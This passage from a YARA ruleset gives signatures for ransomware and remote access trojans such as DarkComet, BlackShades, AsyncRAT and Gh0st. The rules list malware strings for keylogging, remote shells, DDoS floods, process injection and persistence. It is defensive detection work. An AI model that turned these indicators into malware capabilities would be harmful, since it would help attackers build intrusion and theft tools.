0x5a4d and filesize < 200KB ) and all of them \n}\n\nrule shrug2_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Shrug2 ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://blogs.quickheal.com/new-net-ransomware-shrug2/\"\n       \n   strings:\n\n      $s1 = \"C:\\\\Users\\\\Gamer\\\\Desktop\\\\Shrug2\\\\ShrugTwo\\\\ShrugTwo\\\\obj\\\\Debug\\\\ShrugTwo.pdb\" fullword ascii\n      $s2 = \"http://tempacc11vl.000webhostapp.com/\" fullword wide\n      $s4 = \"Shortcut for @ShrugDecryptor@.exe\" fullword wide\n      $s5 = \"C:\\\\Users\\\\\" fullword wide\n      $s6 = \"http://clients3.google.com/generate_204\" fullword wide\n      $s7 = \"\\\\Desktop\\\\@ShrugDecryptor@.lnk\" fullword wide\n   \n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB ) and all of them \n}\n\nrule termite_ransomware {\n\n   meta:\n\n      description = \"Rule to detect Termite Ransomware\"\n      author = \"Marc Rivero | @seifreed\"\n      reference = \"https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-august-31st-2018-devs-on-vacation/\"\n      \n   strings:\n      \n      $s1 = \"C:\\\\Windows\\\\SysNative\\\\mswsock.dll\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\SysWOW64\\\\mswsock.dll\" fullword ascii\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Termite.exe\" fullword ascii\n      $s4 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Payment.exe\" fullword ascii\n      $s5 = \"C:\\\\Windows\\\\Termite.exe\" fullword ascii\n      $s6 = \"\\\\Shell\\\\Open\\\\Command\\\\\" fullword ascii\n      $s7 = \"t314.520@qq.com\" fullword ascii\n      $s8 = \"(*.JPG;*.PNG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.PNG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n      \n   condition:\n   \n      ( uint16(0) == 0x5a4d and filesize < 6000KB ) and all of them \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule Adwind_JAR_PACKA : binary RAT Frutas Unrecom AlienSpy\n{\n meta:\n  author = \"Vitaly Kamluk, Vitaly.Kamluk@kaspersky.com\"\n  reference = \"https://securelist.com/securelist/files/2016/02/KL_AdwindPublicReport_2016.pdf\"\n  last_modified = \"2015-11-30\"\n strings:\n  $b1 = \".class\" ascii\n  $b2 = \"c/a/a/\" ascii\n  $b3 = \"b/a/\" ascii\n  $b4 = \"a.dat\" ascii\n  $b5 = \"META-INF/MANIFEST.MF\" ascii\n condition:\n  int16(0) == 0x4B50 and ($b1 and $b2 and $b3 and $b4 and $b5)\n}\nrule Adwind_JAR_PACKB : binary RAT Frutas Unrecom AlienSpy {\n meta:\n  author = \"Vitaly Kamluk, Vitaly.Kamluk@kaspersky.com\"\n  reference = \"https://securelist.com/securelist/files/2016/02/KL_AdwindPublicReport_2016.pdf\"\n  last_modified = \"2015-11-30\"\n strings:\n  $c1 = \"META-INF/MANIFEST.MF\" ascii\n  $c2 = \"main/Start.class\" ascii\n  $a1 = \"con g/con g.perl\" ascii\n  $b1 = \"java/textito.isn\" ascii\n condition:\n  int16(0) == 0x4B50 and ($c1 and $c2 and ($a1 or $b1))\n}\nrule crime_win_rat_AlienSpy: binary RAT Frutas Unrecom AlienSpy\n{\nmeta:\n\tdescription = \"Alien Spy Remote Access Trojan\"\n\tauthor = \"General Dynamics Fidelis Cybersecurity Solutions - Threat Research Team\"\n\treference_1 = \"www.fidelissecurity.com/sites/default/files/FTA_1015_Alienspy_FINAL.pdf\"\n\treference_2 = \"www.fidelissecurity.com/sites/default/files/AlienSpy-Configs2_1_2.csv\"\n\tdate = \"2015-04-04\"\n\tfiletype = \"Java\"\n\thash_1 = \"075fa0567d3415fbab3514b8aa64cfcb\"\n\thash_2 = \"818afea3040a887f191ee9d0579ac6ed\"\n\thash_3 = \"973de705f2f01e82c00db92eaa27912c\"\n\thash_4 = \"7f838907f9cc8305544bd0ad4cfd278e\"\n\thash_5 = \"071e12454731161d47a12a8c4b3adfea\"\n\thash_6 = \"a7d50760d49faff3656903c1130fd20b\"\n\thash_7 = \"f399afb901fcdf436a1b2a135da3ee39\"\n\thash_8 = \"3698a3630f80a632c0c7c12e929184fb\"\n\thash_9 = \"fdb674cadfa038ff9d931e376f89f1b6\"\n\n   strings:\n\t\t\n        $sa_1 = \"META-INF/MANIFEST.MF\"\n        $sa_2 = \"Main.classPK\"\n        $sa_3 = \"plugins/Server.classPK\"\n        $sa_4 = \"IDPK\"\n\t\t\n        $sb_1 = \"config.iniPK\"\n        $sb_2 = \"password.iniPK\"\n        $sb_3 = \"plugins/Server.classPK\"\n        $sb_4 = \"LoadStub.classPK\"\n        $sb_5 = \"LoadStubDecrypted.classPK\"\n        $sb_7 = \"LoadPassword.classPK\"\n        $sb_8 = \"DecryptStub.classPK\"\n        $sb_9 = \"ClassLoaders.classPK\"\n\t\t\n        $sc_1 = \"config.xml\"\n        $sc_2 = \"options\"\n        $sc_3 = \"plugins\"\n        $sc_4 = \"util\"\n        $sc_5 = \"util/OSHelper\"\n        $sc_6 = \"Start.class\"\n        $sc_7 = \"AlienSpy\"\n        $sc_8 = \"PK\"\n\t\n  condition:\n    \n\tuint16(0) == 0x4B50 and filesize < 800KB and ( (all of ($sa_*)) or (all of ($sb_*)) or (all of ($sc_*)) )\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n*/\n\nrule Adzok : binary RAT Adzok\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tDescription = \"Adzok Rat\"\n\t\tVersions = \"Free 1.0.0.3,\"\n\t\tdate = \"2015/05\"\n\t\tref = \"http://malwareconfig.com/stats/Adzok\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"jar\"\n\n\tstrings:\n\t\t$a1 = \"config.xmlPK\"\n\t\t$a2 = \"key.classPK\"\n\t\t$a3 = \"svd$1.classPK\"\n\t\t$a4 = \"svd$2.classPK\"\n    \t$a5 = \"Mensaje.classPK\"\n\t\t$a6 = \"inic$ShutdownHook.class\"\n\t\t$a7 = \"Uninstall.jarPK\"\n\t\t$a8 = \"resources/icono.pngPK\"\n        \n\tcondition:\n    7 of ($a*)\n}\n\n/*\n   This Yara ruleset is under the GNU-GPLv2 license \n   (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or \n   organization, as long as you use it under this license.\n*/\n\nrule win_asyncrat_j1 {\n\n    meta:\n        author      = \"Johannes Bader @viql\"\n        date        = \"2020-04-26\"\n        description = \"detects AsyncRAT\"\n        references  = \"https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp\"\n        tlp         = \"white\"\n\n    strings:\n        $str_anti_1 = \"VIRTUAL\" wide\n        $str_anti_2 = \"vmware\" wide\n        $str_anti_3 = \"VirtualBox\" wide\n        $str_anti_4 = \"SbieDll.dll\" wide\n\n        $str_miner_1 = \"--donate-level=\" wide\n\n        $str_b_rev_run    = \"\\\\nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\erawtfoS\" wide\n        $str_b_msg_pack_1 = \"(ext8,ext16,ex32) type $c7,$c8,$c9\" wide\n        $str_b_msg_pack_2 = \"(never used) type $c1\" wide\n        $str_b_schtask_1  = \"/create /f /sc ONLOGON /RL HIGHEST /tn \\\"'\" wide\n        $str_b_schtask_2  = \"\\\"' /tr \\\"'\" wide\n\n        $str_config_1 = \"Antivirus\" wide\n        $str_config_2 = \"Pastebin\" wide\n        $str_config_3 = \"HWID\" wide\n        $str_config_4 = \"Installed\" wide\n        $str_config_5 = \"Pong\" wide\n        $str_config_6 = \"Performance\" wide\n\n    condition:\n        all of ($str_anti_*)  and \n        4 of ($str_config_*) and ( \n            all of ($str_miner_*) or \n            3 of ($str_b_*)\n        )\n        \n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule BlackShades_3 : Trojan RAT\n{\n    meta:\n        description = \"BlackShades RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $mod1 = /(m)odAPI/\n        $mod2 = /(m)odAudio/\n        $mod3 = /(m)odBtKiller/\n        $mod4 = /(m)odCrypt/\n        $mod5 = /(m)odFuctions/\n        $mod6 = /(m)odHijack/\n        $mod7 = /(m)odICallBack/\n        $mod8 = /(m)odIInet/\n        $mod9 = /(m)odInfect/\n        $mod10 = /(m)odInjPE/\n        $mod11 = /(m)odLaunchWeb/\n        $mod12 = /(m)odOS/\n        $mod13 = /(m)odPWs/\n        $mod14 = /(m)odRegistry/\n        $mod15 = /(m)odScreencap/\n        $mod16 = /(m)odSniff/\n        $mod17 = /(m)odSocketMaster/\n        $mod18 = /(m)odSpread/\n        $mod19 = /(m)odSqueezer/\n        $mod20 = /(m)odSS/\n        $mod21 = /(m)odTorrentSeed/\n\n        $tmr1 = /(t)mrAlarms/\n        $tmr2 = /(t)mrAlive/\n        $tmr3 = /(t)mrAnslut/\n        $tmr4 = /(t)mrAudio/\n        $tmr5 = /(t)mrBlink/\n        $tmr6 = /(t)mrCheck/\n        $tmr7 = /(t)mrCountdown/\n        $tmr8 = /(t)mrCrazy/\n        $tmr9 = /(t)mrDOS/\n        $tmr10 = /(t)mrDoWork/\n        $tmr11 = /(t)mrFocus/\n        $tmr12 = /(t)mrGrabber/\n        $tmr13 = /(t)mrInaktivitet/\n        $tmr14 = /(t)mrInfoTO/\n        $tmr15 = /(t)mrIntervalUpdate/\n        $tmr16 = /(t)mrLiveLogger/\n        $tmr17 = /(t)mrPersistant/\n        $tmr18 = /(t)mrScreenshot/\n        $tmr19 = /(t)mrSpara/\n        $tmr20 = /(t)mrSprid/\n        $tmr21 = /(t)mrTCP/\n        $tmr22 = /(t)mrUDP/\n        $tmr23 = /(t)mrWebHide/\n\n    condition:    \n        10 of ($mod*) or 10 of ($tmr*)\n}\n\nrule BlackShades2 : Trojan RAT\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"26/06/2013\"\n\t\tdescription=\"BlackShades Server\"\n\t\t\n\tstrings:\n\t\t$signature1={62 73 73 5F 73 65 72 76 65 72}\n\t\t$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}\n\t\t$signature3={6D 6F 64 49 6E 6A 50 45}\n\t\t\n\tcondition:\n\t\t$signature1 and $signature2 and $signature3\n}\n\nrule BlackShades_4 : rat\n{\n\tmeta:\n\t\tdescription = \"BlackShades\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$a = { 42 00 6C 00 61 00 63 00 6B 00 73 00 68 00 61 00 64 00 65 00 73 }\n\t\t$b = { 36 00 3C 00 32 00 20 00 32 00 32 00 26 00 31 00 39 00 3E 00 1D 00 17 00 17 00 1C 00 07 00 1B 00 03 00 07 00 28 00 23 00 0C 00 1D 00 10 00 1B 00 12 00 00 00 28 00 37 00 10 00 01 00 06 00 11 00 0B 00 07 00 22 00 11 00 17 00 00 00 1D 00 1B 00 0B 00 2F 00 26 00 01 00 0B }\n\t\t$c = { 62 73 73 5F 73 65 72 76 65 72 }\n\t\t$d = { 43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44 }\n\t\t$e = { 6D 6F 64 49 6E 6A 50 45 }\n\t\t$apikey = \"f45e373429c0def355ed9feff30eff9ca21eec0fafa1e960bea6068f34209439\"\n\n\tcondition:\n\t\tany of ($a, $b, $c, $d, $e) or $apikey\t\t\n}\n\n\nrule BlackShades : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"26/06/2013\"\n\t\tdescription=\"BlackShades Server\"\n\t\t\n\tstrings:\n\t\t$signature1={62 73 73 5F 73 65 72 76 65 72}\n\t\t$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}\n\t\t$signature3={6D 6F 64 49 6E 6A 50 45}\n\t\t\n\tcondition:\n\t\t$signature1 and $signature2 and $signature3\n}\n\nrule BlackShades_25052015\n{\n    meta:\n        author = \"Brian Wallace (@botnet_hunter)\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/PoisonIvy\"\n        ref = \"http://blog.cylance.com/a-study-in-bots-blackshades-net\"\n        family = \"blackshades\"\n\n    strings:\n        $string1 = \"bss_server\"\n        $string2 = \"txtChat\"\n        $string3 = \"UDPFlood\"\n    condition:\n        all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule Bolonyokte : rat \n{\n\tmeta:\n\t\tdescription = \"UnknownDotNet RAT - Bolonyokte\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-02-01\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$campaign1 = \"Bolonyokte\" ascii wide\n\t\t$campaign2 = \"donadoni\" ascii wide\n\t\t\n\t\t$decoy1 = \"nyse.com\" ascii wide\n\t\t$decoy2 = \"NYSEArca_Listing_Fees.pdf\" ascii wide\n\t\t$decoy3 = \"bf13-5d45cb40\" ascii wide\n\t\t\n\t\t$artifact1 = \"Backup.zip\"  ascii wide\n\t\t$artifact2 = \"updates.txt\" ascii wide\n\t\t$artifact3 = \"vdirs.dat\" ascii wide\n\t\t$artifact4 = \"default.dat\"\n\t\t$artifact5 = \"index.html\"\n\t\t$artifact6 = \"mime.dat\"\n\t\t\n\t\t$func1 = \"FtpUrl\"\n\t\t$func2 = \"ScreenCapture\"\n\t\t$func3 = \"CaptureMouse\"\n\t\t$func4 = \"UploadFile\"\n\n\t\t$ebanking1 = \"Internet Banking\" wide\n\t\t$ebanking2 = \"(Online Banking)|(Online banking)\"\n\t\t$ebanking3 = \"(e-banking)|(e-Banking)\" nocase\n\t\t$ebanking4 = \"login\"\n\t\t$ebanking5 = \"en ligne\" wide\n\t\t$ebanking6 = \"bancaires\" wide\n\t\t$ebanking7 = \"(eBanking)|(Ebanking)\" wide\n\t\t$ebanking8 = \"Anmeldung\" wide\n\t\t$ebanking9 = \"internet banking\" nocase wide\n\t\t$ebanking10 = \"Banking Online\" nocase wide\n\t\t$ebanking11 = \"Web Banking\" wide\n\t\t$ebanking12 = \"Power\"\n\n\tcondition:\n\t\tany of ($campaign*) or 2 of ($decoy*) or 2 of ($artifact*) or all of ($func*) or 3 of ($ebanking*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as\n    long as you use it under this license.\n*/\nrule Bozok : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Bozok\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"getVer\" nocase\n\t\t$b = \"StartVNC\" nocase\n\t\t$c = \"SendCamList\" nocase\n\t\t$d = \"untPlugin\" nocase\n\t\t$e = \"gethostbyname\" nocase\n\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule Cerberus : RAT memory\n{\n\tmeta:\n\t\tdescription = \"Cerberus\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$checkin = \"Ypmw1Syv023QZD\"\n\t\t$clientpong = \"wZ2pla\"\n\t\t$serverping = \"wBmpf3Pb7RJe\"\n\t\t$generic = \"cerberus\" nocase\n\n\tcondition:\n\t\tany of them\n}\n\nrule Crimson: RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tDescription = \"Crimson Rat\"\n\t\tdate = \"2015/05\"\n\t\tref = \"http://malwareconfig.com/stats/Crimson\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"jar\"\n\n\tstrings:\n\t\t$a1 = \"com/crimson/PK\"\n\t\t$a2 = \"com/crimson/bootstrapJar/PK\"\n\t\t$a3 = \"com/crimson/permaJarMulti/PermaJarReporter$1.classPK\"\n\t\t$a4 = \"com/crimson/universal/containers/KeyloggerLog.classPK\"\n        $a5 = \"com/crimson/universal/UploadTransfer.classPK\"\n        \n\tcondition:\n        all of ($a*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as\n    long as you use it under this license.\n*/\nrule CyberGate : RAT\n{\n\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/CyberGate\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}\n\t\t$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}\n\t\t$string3 = \"EditSvr\"\n\t\t$string4 = \"TLoader\"\n\t\t$string5 = \"Stroks\"\n\t\t$string6 = \"####@####\"\n\t\t$res1 = \"XX-XX-XX-XX\"\n\t\t$res2 = \"CG-CG-CG-CG\"\n\n\tcondition:\n\t\tall of ($string*) and any of ($res*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule DarkComet_1 : RAT\n{\n    meta:\n        description = \"DarkComet RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $bot1 = /(#)BOT#OpenUrl/ wide ascii\n        $bot2 = /(#)BOT#Ping/ wide ascii\n        $bot3 = /(#)BOT#RunPrompt/ wide ascii\n        $bot4 = /(#)BOT#SvrUninstall/ wide ascii\n        $bot5 = /(#)BOT#URLDownload/ wide ascii\n        $bot6 = /(#)BOT#URLUpdate/ wide ascii\n        $bot7 = /(#)BOT#VisitUrl/ wide ascii\n        $bot8 = /(#)BOT#CloseServer/ wide ascii\n\n        $ddos1 = /(D)DOSHTTPFLOOD/ wide ascii\n        $ddos2 = /(D)DOSSYNFLOOD/ wide ascii\n        $ddos3 = /(D)DOSUDPFLOOD/ wide ascii\n\n        $keylogger1 = /(A)ctiveOnlineKeylogger/ wide ascii\n        $keylogger2 = /(U)nActiveOnlineKeylogger/ wide ascii\n        $keylogger3 = /(A)ctiveOfflineKeylogger/ wide ascii\n        $keylogger4 = /(U)nActiveOfflineKeylogger/ wide ascii\n\n        $shell1 = /(A)CTIVEREMOTESHELL/ wide ascii\n        $shell2 = /(S)UBMREMOTESHELL/ wide ascii\n        $shell3 = /(K)ILLREMOTESHELL/ wide ascii\n\n    condition:\n        4 of ($bot*) or all of ($ddos*) or all of ($keylogger*) or all of ($shell*)\n}\n\nrule DarkComet_2 : rat\n{\n\tmeta:\n\t\tdescription = \"DarkComet\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\n\tstrings:\n\t\t$a = \"#BEGIN DARKCOMET DATA --\"\n\t\t$b = \"#EOF DARKCOMET DATA --\"\n\t\t$c = \"DC_MUTEX-\"\n\t\t$k1 = \"#KCMDDC5#-890\"\n\t\t$k2 = \"#KCMDDC51#-890\"\n\n\tcondition:\n\t\tany of them\n}\nrule DarkComet_3 : RAT\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/DarkComet\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t// Versions 2x\n\t\t$a1 = \"#BOT#URLUpdate\"\n\t\t$a2 = \"Command successfully executed!\"\n\t\t$a3 = \"MUTEXNAME\" wide\n\t\t$a4 = \"NETDATA\" wide\n\t\t// Versions 3x & 4x & 5x\n\t\t$b1 = \"FastMM Borland Edition\"\n\t\t$b2 = \"%s, ClassID: %s\"\n\t\t$b3 = \"I wasn't able to open the hosts file\"\n\t\t$b4 = \"#BOT#VisitUrl\"\n\t\t$b5 = \"#KCMDDC\"\n\tcondition:\n\t\tall of ($a*) or all of ($b*)\n}\n\nrule DarkComet_Keylogger_File  : RAT\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"Looks like a keylogger file created by DarkComet Malware\"\n\t\tdate = \"25.07.14\"\n\t\treference = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tscore = 50\n\tstrings:\n\t\t$magic = \"::\"\n\t\t$entry = /\\n:: [A-Z]/\n\t\t$timestamp = /\\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\\)/\n\tcondition:\n\t\t($magic at 0) and #entry > 10 and #timestamp > 10\n}\nrule DarkComet_4  : RAT\n{\tmeta:\n\t\treference = \"https://github.com/bwall/bamfdetect/blob/master/BAMF_Detect/modules/yara/darkcomet.yara\"\n\tstrings:\n\t    $a1 = \"#BOT#\"\n\t    $a2 = \"WEBCAMSTOP\"\n\t    $a3 = \"UnActiveOnlineKeyStrokes\"\n\t    $a4 = \"#SendTaskMgr\"\n\t    $a5 = \"#RemoteScreenSize\"\n\t    $a6 = \"ping 127.0.0.1 -n 4 > NUL &&\"\n\tcondition:\n\t\tall of them\n}\n\nrule DarkComet_5\n{ \n\tmeta:\n\t\tmaltype = \"DarkComet RAT\"\n\t\tauthor = \"https://github.com/reed1713\"\n\t\tdescription = \"Malware creates the MSDCSC directory, which is a common path utilized by DarkComet, as well as the mutex pattern.\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=/AppData\\\\Local\\\\Temp\\\\MSDCSC\\\\.+\\.exe/\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4674\"\n\t\t$data1=/DC_MUTEX-[0-9A-Z]{7}/\n\tcondition:\n\t\t($type and $eventid and $data) or ($type1 and $eventid1 and $data1)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule FlyingKitten : rat\n{\n    meta:\n        Author      = \"CrowdStrike, Inc\"\n        Date        = \"2014/05/13\"\n        Description = \"Flying Kitten RAT\"\n        Reference   = \"http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten\"\n\n    strings:\n        $classpath = \"Stealer.Properties.Resources.resources\"\n        $pdbstr = \"\\\\Stealer\\\\obj\\\\x86\\\\Release\\\\Stealer.pdb\"\n\n    condition:\n        all of them and uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x4550 and uint16(uint32(0x3C) + 0x16) & 0x2000 == 0 and ((uint16(uint32(0x3c)+24) == 0x010b and uint32(uint32(0x3c)+232) > 0) or (uint16(uint32(0x3c)+24) == 0x020b and uint32(uint32(0x3c)+248) > 0)) \n\n}\n\nrule CSIT_14003_03 : installer RAT\n{ \n    meta:\n        Author      = \"CrowdStrike, Inc\"\n        Date        = \"2014/05/13\"\n        Description = \"Flying Kitten Installer\"\n        Reference   = \"http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten\"\n\n    strings:\n        $exename = \"IntelRapidStart.exe\"\n        $confname = \"IntelRapidStart.exe.config\"\n        $cabhdr = { 4d 53 43 46 00 00 00 00 } \n\n    condition:\n        all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule APT_WIN_Gh0st_ver : RAT\n{\nmeta:\n   author = \"@BryanNolen\"\n   date = \"2012-12\"\n   type = \"APT\"\n   version = \"1.1\"\n   ref = \"Detection of Gh0st RAT server DLL component\"\n   ref1 = \"http://www.mcafee.com/au/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf\"\n strings:  \n   $library = \"deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly\"\n   $capability = \"GetClipboardData\"\n   $capability1 = \"capCreateCaptureWindowA\"\n   $capability2 = \"CreateRemoteThread\"\n   $capability3 = \"WriteProcessMemory\"\n   $capability4 = \"LsaRetrievePrivateData\"\n   $capability5 = \"AdjustTokenPrivileges\"\n   $function = \"ResetSSDT\"\n   $window = \"WinSta0\\\\Default\"\n   $magic = {47 6C 6F 62 61 6C 5C [5-9] 20 25 64}    /* $magic = \"Gh0st\" */\n condition:\n   all of them\n}\n\nrule Gh0st : RAT\n{\n    meta:\n        description = \"Gh0st\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $ = /(G)host/\n        $ = /(i)nflate 1\\.1\\.4 Copyright 1995-2002 Mark Adler/\n        $ = /(d)eflate 1\\.1\\.4 Copyright 1995-2002 Jean-loup Gailly/\n        $ = /(%)s\\\\shell\\\\open\\\\command/\n        $ = /(G)etClipboardData/\n        $ = /(W)riteProcessMemory/\n        $ = /(A)djustTokenPrivileges/\n        $ = /(W)inSta0\\\\Default/\n        $ = /(#)32770/\n        $ = /(#)32771/\n        $ = /(#)32772/\n        $ = /(#)32774/\n\n    condition:\n        all of them\n}\n\nrule gh0st\n\n{\n\nmeta:\n\tauthor = \"https://github.com/jackcr/\"\n\n   strings:\n      $a = { 47 68 30 73 74 ?? ?? ?? ?? ?? ?? ?? ?? 78 9C }\n      $b = \"Gh0st Update\"\n\n   condition:\n      any of them\n\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule gholeeV1\n{\n    meta:\n\t Author = \"@GelosSnake\"\n    \t Date = \"2014/08\"\n    \t Description = \"Gholee first discovered variant \"\n\t Reference = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\" \n\n    strings:\n    \t $a = \"sandbox_avg10_vc9_SP1_2011\"\n    \t $b = \"gholee\"\n\n    condition:\n    \t all of them\n}\n\nrule gholeeV2\n{\n   meta:\n\tAuthor = \"@GelosSnake\"\n\tDate = \"2015-02-12\"\n    \tDescription = \"Gholee first discovered variant \"\n\tReference = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\" \n\n   strings:\n\t$string0 = \"RichHa\"\n\t$string1 = \"         (((((                  H\" wide\n\t$string2 = \"1$1,141<1D1L1T1\\\\1d1l1t1\"\n\t$string3 = \"<8;$O' \"\n\t$string4 = \"@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]\"\n\t$string5 = \"jYPQTVTSkllZTTXRTUiHceWda/\"\n\t$string6 = \"urn:schemas-microsoft-com:asm.v1\"\n\t$string7 = \"8.848H8O8i8s8y8\"\n\t$string8 = \"wrapper3\" wide\n\t$string9 = \"pwwwwwwww\"\n\t$string10 = \"Sunday\"\n\t$string11 = \"YYuTVWh\"\n\t$string12 = \"DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN\"\n\t$string13 = \"ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt\"\n\t$string15 = \"wrapper3 Version 1.0\" wide\n\t$string16 = \"77A779\"\n\t$string17 = \"<C<G<M<R<X<\"\n\t$string18 = \"9 9-9N9X9s9\"\n\n    condition:\n\t18 of them\n}\n\nrule MW_gholee_v1 : v1\n{\nmeta:\n    Author = \"@GelosSnake\"\n    description = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\"\n    date = \"2014-08\"\n    maltype = \"Remote Access Trojan\"\n    sample_filetype = \"dll\"\n    hash0 = \"48573a150562c57742230583456b4c02\"\n   \nstrings:\n    $a = \"sandbox_avg10_vc9_SP1_2011\"\n    $b = \"gholee\"\n   \ncondition:\n    all of them\n}\n \nrule MW_gholee_v2 : v2\n{\nmeta:\n        author = \"@GelosSnake\"\n        date = \"2015-02-12\"\n        description = \"http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html\"\n        hash0 = \"05523761ca296ec09afdf79477e5f18d\"\n        hash1 = \"08e424ac42e6efa361eccefdf3c13b21\"\n        hash2 = \"5730f925145f1a1cd8380197e01d9e06\"\n        hash3 = \"73461c8578dd9ab86d42984f30c04610\"\n        